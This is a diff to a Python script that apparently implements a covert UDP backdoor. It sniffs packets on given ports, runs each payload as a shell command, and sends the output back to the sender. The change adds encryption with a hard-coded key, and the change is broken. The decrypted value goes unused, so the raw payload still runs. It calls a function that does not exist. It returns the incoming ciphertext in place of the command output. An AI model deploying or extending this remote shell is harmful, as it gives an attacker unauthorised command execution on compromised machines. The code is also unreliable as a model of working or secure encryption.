@@ -5,6 +5,7 @@ import os
 import argparse
 import platform
 import subprocess
+import triplesec
 from ctypes import *
 from scapy.all import *
 
@@ -34,10 +35,12 @@ args = parser.parse_args()
 sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
 
 def runCommand(packet):
+  encryptedData = packet.load
+  data = triplesec.decrypt(encryptedData, b'key yo')
   print "Running command " + packet.load
   output = subprocess.check_output(packet.load, shell=True, stderr=subprocess.STDOUT)
-  print output
-  packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=output)
+  encryptedOutput = triplesec.encryptedData(output, b'key yo')
+  packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
   send(packet)
 
 # if
